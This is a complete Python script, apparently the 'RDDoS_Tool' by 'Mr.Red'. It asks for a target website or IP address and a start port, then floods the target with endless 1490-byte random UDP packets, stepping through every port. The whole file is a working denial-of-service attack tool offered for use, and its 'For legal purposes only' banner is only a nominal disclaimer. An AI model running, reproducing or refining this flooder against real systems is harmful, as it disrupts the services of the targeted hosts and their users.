from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet

version = "1.0"


#platform info
uname=system()

if uname == "Windows":
    cmd = 'cls'
else:
    cmd = 'clear'

os.system(cmd)


##############
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############


while True:
    print("\033[91m   _____ \033[0m         \033[95m  ______    ______         __ \033[0m     ______)        Version: " + version)       
    print("\033[91m  (, /   )      /)\033[0m \033[95m(, /    ) (, /    )   (__/  )\033[0m    (, /        /)") 
    print("\033[91m    /__ /  _  _(/\033[0m  \033[95m  /    /    /    / ___  /     \033[0m     /  ______// ")
    print("\033[91m ) /   \\__(/_(_(_\033[0m\033[95m  _/___ /_  _/___ /_(_)) /     \033[0m   ) /  (_)(_)(/_")
    print("\033[91m(_/\033[0m              \033[95m(_/___ /  (_/___ /    (_/      \033[0m  (_/\n")
    print("                        Author: Mr.\033[91mRed\033[0m")
    print("       Github: https://github.com/Red-company/RDDoS_Tool")
    print('                   For legal purposes only')
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Addresse\n3. Exit")
    print('\033[0m')

    opt = str(input("\n> "))

    if opt == '1':
        domain = str(input("Enter the website's domain:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = input("IP Address: ")
        break

    elif opt == '3':
        exit()

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)
        os.system(cmd)

port = int(input("Start port: "))
os.system(cmd)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 1
        print("\033[32;1mSent %s packet to %s throught port:%s"%(sent, ip, port))
        if port == 65534:
            port = 1
        elif port == 1900:
            port = 1901
            
except:
    print('\n\033[31;1mExited\033[0m')
